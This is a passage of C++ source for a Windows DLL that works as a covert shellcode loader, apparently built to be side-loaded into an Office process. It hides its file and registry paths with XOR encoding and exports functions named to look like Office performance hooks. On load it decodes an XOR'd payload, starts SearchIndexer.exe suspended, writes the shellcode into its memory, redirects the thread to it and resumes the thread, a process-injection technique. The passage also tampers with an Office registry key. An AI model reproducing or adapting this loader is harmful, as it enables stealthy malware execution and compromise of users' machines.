		std::fstream file_in((LPCWSTR)(LPCWSTR)strXOR("\x09\x70\x16\x1a\x38\x25\x2d\x38\x2b\x27\x0e\x2b\x3e\x2b\x16\x07\x23\x29\x38\x25\x39\x25\x2c\x3e\x6a\x05\x24\x2f\x0e\x38\x23\x3c\x2f\x16\x1a\x2b\x29\x21\x2b\x2d\x2f\x39\x16\x6f\x1a\x18\x05\x09\x0f\x19\x19\x05\x18\x15\x0b\x18\x09\x02\x03\x1e\x0f\x09\x1e\x1f\x18\x0f\x6f\x16\x05\x24\x2f\x0e\x38\x23\x3c\x2f\x19\x2f\x3e\x3f\x3a\x78\x64\x2f\x32\x2f\x70\x2e\x2b\x3e\x2f"), std::ios_base::binary | std::ios_base::in);

		//Check if a connection failure already occured and if it is over our limit
		if (file_in.peek() != std::ifstream::traits_type::eof())
		{
			file_in.read((char*)&Lastfailue, sizeof(time_t));
			file_in.close();

			seconds = CurrentDate - Lastfailue;
			minutes = seconds / 60;
			hours = seconds / (60 * 60);

			//check if limit has been reached
			if (hours > 1)
			{
				HKEY hKey = NULL;
				long openkey = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)((LPCSTR)strXOR("\x19\x05\x0c\x1e\x1d\x0b\x18\x0f\x16\x07\x23\x29\x38\x25\x39\x25\x2c\x3e\x16\x05\x2c\x2c\x23\x29\x2f\x6a\x3e\x2f\x39\x3e\x16\x19\x3a\x2f\x29\x23\x2b\x26\x16\x1a\x2f\x38\x2c")), 0L, KEY_SET_VALUE, &hKey);
				RegDeleteKey(HKEY_CURRENT_USER, (LPCSTR)((LPCSTR)strXOR("\x19\x05\x0c\x1e\x1d\x0b\x18\x0f\x16\x07\x23\x29\x38\x25\x39\x25\x2c\x3e\x16\x05\x2c\x2c\x23\x29\x2f\x6a\x3e\x2f\x39\x3e\x16\x19\x3a\x2f\x29\x23\x2b\x26\x16\x1a\x2f\x38\x2c")));
			}
		}
		//Document first connection failure
		else
		{
			file_in.close();
			std::fstream file_out((LPCSTR)(LPCWSTR)strXOR("\x09\x70\x16\x1a\x38\x25\x2d\x38\x2b\x27\x0e\x2b\x3e\x2b\x16\x07\x23\x29\x38\x25\x39\x25\x2c\x3e\x6a\x05\x24\x2f\x0e\x38\x23\x3c\x2f\x16\x1a\x2b\x29\x21\x2b\x2d\x2f\x39\x16\x6f\x1a\x18\x05\x09\x0f\x19\x19\x05\x18\x15\x0b\x18\x09\x02\x03\x1e\x0f\x09\x1e\x1f\x18\x0f\x6f\x16\x05\x24\x2f\x0e\x38\x23\x3c\x2f\x19\x2f\x3e\x3f\x3a\x78\x64\x2f\x32\x2f\x70\x2e\x2b\x3e\x2f"), std::ios_base::binary | std::ios_base::out);
			file_out.write((char *)&CurrentDate, sizeof(time_t));
			file_out.close();
		}
	}
	else
	{
		time_t Lastfailue;
		std::fstream file_out((LPCSTR)(LPCWSTR)strXOR("\x09\x70\x16\x1a\x38\x25\x2d\x38\x2b\x27\x0e\x2b\x3e\x2b\x16\x07\x23\x29\x38\x25\x39\x25\x2c\x3e\x6a\x05\x24\x2f\x0e\x38\x23\x3c\x2f\x16\x1a\x2b\x29\x21\x2b\x2d\x2f\x39\x16\x6f\x1a\x18\x05\x09\x0f\x19\x19\x05\x18\x15\x0b\x18\x09\x02\x03\x1e\x0f\x09\x1e\x1f\x18\x0f\x6f\x16\x05\x24\x2f\x0e\x38\x23\x3c\x2f\x19\x2f\x3e\x3f\x3a\x78\x64\x2f\x32\x2f\x70\x2e\x2b\x3e\x2f"), std::ios::binary | std::ios_base::out | std::ios_base::trunc);
		file_out.close();
		std::fstream file_in((LPCSTR)(LPCWSTR)strXOR("\x09\x70\x16\x1a\x38\x25\x2d\x38\x2b\x27\x0e\x2b\x3e\x2b\x16\x07\x23\x29\x38\x25\x39\x25\x2c\x3e\x6a\x05\x24\x2f\x0e\x38\x23\x3c\x2f\x16\x1a\x2b\x29\x21\x2b\x2d\x2f\x39\x16\x6f\x1a\x18\x05\x09\x0f\x19\x19\x05\x18\x15\x0b\x18\x09\x02\x03\x1e\x0f\x09\x1e\x1f\x18\x0f\x6f\x16\x05\x24\x2f\x0e\x38\x23\x3c\x2f\x19\x2f\x3e\x3f\x3a\x78\x64\x2f\x32\x2f\x70\x2e\x2b\x3e\x2f"), std::ios_base::binary | std::ios_base::in);
		if (file_in.peek() != std::ifstream::traits_type::eof())
		{
			file_in.read((char*)&Lastfailue, sizeof(time_t));
		}
		file_in.close();
	}
	return open;
}

//Finds the the process owner to ensure we are looking at the correct process
bool ExtractProcessOwner(HANDLE hProcess_i,
	CString& csOwner_o)
{

	// Get process token
	HANDLE hProcessToken = NULL;
	if (!::OpenProcessToken(hProcess_i, TOKEN_READ, &hProcessToken) || !hProcessToken)
	{
		return false;
	}

	// First get size needed, TokenUser indicates we want user information from given token
	DWORD dwProcessTokenInfoAllocSize = 0;
	::GetTokenInformation(hProcessToken, TokenUser, NULL, 0, &dwProcessTokenInfoAllocSize);

	// Call should have failed due to zero-length buffer.
	if (::GetLastError() == ERROR_INSUFFICIENT_BUFFER)
	{
		// Allocate buffer for user information in the token.
		PTOKEN_USER pUserToken = reinterpret_cast<PTOKEN_USER>(new BYTE[dwProcessTokenInfoAllocSize]);
		if (pUserToken != NULL)
		{
			// Now get user information in the allocated buffer
			if (::GetTokenInformation(hProcessToken, TokenUser, pUserToken, dwProcessTokenInfoAllocSize, &dwProcessTokenInfoAllocSize))
			{
				// Some vars that we may need
				SID_NAME_USE   snuSIDNameUse;
				TCHAR          szUser[MAX_PATH] = { 0 };
				DWORD          dwUserNameLength = MAX_PATH;
				TCHAR          szDomain[MAX_PATH] = { 0 };
				DWORD          dwDomainNameLength = MAX_PATH;

				// Retrieve user name and domain name based on user's SID.
				if (::LookupAccountSid(NULL,
					pUserToken->User.Sid,
					szUser,
					&dwUserNameLength,
					szDomain,
					&dwDomainNameLength,
					&snuSIDNameUse))
				{
					// Prepare user name string
					csOwner_o = _T("\\\\");
					csOwner_o += szDomain;
					csOwner_o += _T("\\");
					csOwner_o += szUser;

					// We are done!
					CloseHandle(hProcessToken);
					delete[] pUserToken;

					// We succeeded
					return true;
				}
			}

			delete[] pUserToken;
		}
	}

	CloseHandle(hProcessToken);
	return false;
}

//Checks is the process is already running to avoid multiple executions
bool CheckIfRunning() {
	bool safetoexec = true;
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);
	CString csOwner_o = "";

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	char username[256 + 1];
	DWORD username_len = 256 + 1;
	GetUserName(username, &username_len);

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			if (_stricmp(entry.szExeFile, (const char*)"SearchIndexer.exe") == 0)
			{
				HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);

				ExtractProcessOwner(hProcess, csOwner_o);
				if (csOwner_o != ""  && csOwner_o.Find(username) != -1)
				{
					safetoexec = false;
				}
				CloseHandle(hProcess);
			}
		}
	}
	CloseHandle(snapshot);
	return safetoexec;
}

bool SafetoExecute()
{
	bool safetoexec = false;
	WCHAR path[MAX_PATH] = { 0 };
	GetModuleFileNameW(NULL, path, MAX_PATH);
	std::wstring ws(path);
	std::string fullpath(ws.begin(), ws.end());
	std::string office3 = "ic";
	std::string office4 = "e";
	//std::size_t found3 = fullpath.find(office1 + office2 + office3 + office4);
	std::size_t found3 = fullpath.find(program);

	SetEnvironmentVariable(TEXT("pathinfoV"), fullpath.c_str());
	if (found3 != std::string::npos)
	{
		safetoexec = CheckIfRunning();
	}
	return safetoexec;
}

//XORPayloadFunction
//e is the xor'ed payload
//k is the key
//d is the returned payload
//void XORandDrop(unsigned char* e, unsigned char* k, unsigned char* d)
void XORandDrop(unsigned char* e, char k, unsigned char* d)
{
	int j = 0;
	for (int i = 1; i < size; i = i + 2)
	{
		//d[j] = e[i] ^ k[i];
		d[j] = e[i] ^ k;
		j++;
	}

}

void ExecPay(void) {
	char process[40];
	strncpy_s(process, "SearchIndexer.exe", sizeof(process) - 1);
	PROCESS_INFORMATION prosinf;
	STARTUPINFO startinf;
	CONTEXT contx;
	LPVOID rp;
	unsigned char d[size / 2];
	PROCESS_INFORMATION processInformation = { 0 };
	STARTUPINFO startupInfo = { 0 };
	// Start up the payload in a new process
	bzero_cust(&startinf, sizeof(startinf));
	startinf.cb = sizeof(startinf);
	//CreateProcess("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, "C:\\Windows\\System32", &startupInfo, &processInformation);

	// Create a suspended process, write shellcode into stack, make stack RWX, resume it
	if (CreateProcess(0, process, 0, 0, 0, CREATE_SUSPENDED | IDLE_PRIORITY_CLASS, 0, 0, &startinf, &prosinf)) {
		contx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
		GetThreadContext(prosinf.hThread, &contx);

		rp = (LPVOID)VirtualAllocEx(prosinf.hProcess, NULL, shsize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

		XORandDrop(bits, 'J', d);

		WriteProcessMemory(prosinf.hProcess, (PVOID)rp, &d, shsize, 0);
#ifdef _WIN64
		contx.Rip = (DWORD64)rp;
#else
		contx.Eip = (DWORD)rp;
#endif

		SetThreadContext(prosinf.hThread, &contx);

		ResumeThread(prosinf.hThread);
		//CreateProcess("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, "C:\\Windows", &startupInfo, &processInformation);
		CloseHandle(prosinf.hThread);
		CloseHandle(prosinf.hProcess);
	}
	return;
}

void PrepPay(void)
{
	bool safetoexec = false;
	bool open = false;
	BOOL result = true;
	int valueLength = 512;
	TCHAR* envVarValue = new TCHAR[valueLength];
	DWORD len = NULL;
	//Uses environment variable to stop multiple executions per document open.
	len = GetEnvironmentVariable("PROCESSOR_CORES", envVarValue, valueLength);
	if (!len)
	{
		if (SafetoExecute())
		{
			SetEnvironmentVariable((TEXT("PROCESSOR_CORES")), (TEXT("1")));
			open = uptime();
			safetoexec = true;
		}
		if (safetoexec && open)
		{

			BOOL result = true;
			int valueLength = 512;
			TCHAR* envVarValue = new TCHAR[valueLength];
			DWORD len = NULL;
			ExecPay();
		}

	}
	return;
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	PROCESS_INFORMATION processInformation = { 0 };
	STARTUPINFO startupInfo = { 0 };
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
#ifdef _WIN32
		PrepPay();
#endif
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

#ifdef _WIN64
//Exploit moved to extern for safer execution
extern "C" __declspec(dllexport) void GetPerfhostHookVersion()
{
	PrepPay();
	return;
}

extern "C" __declspec(dllexport) void _PerfCodeMarker()
{
	//PrepPay();
	return;
}


extern "C" __declspec(dllexport) void _UnInitPerf()
{
	//PrepPay();
	return;
}

#endif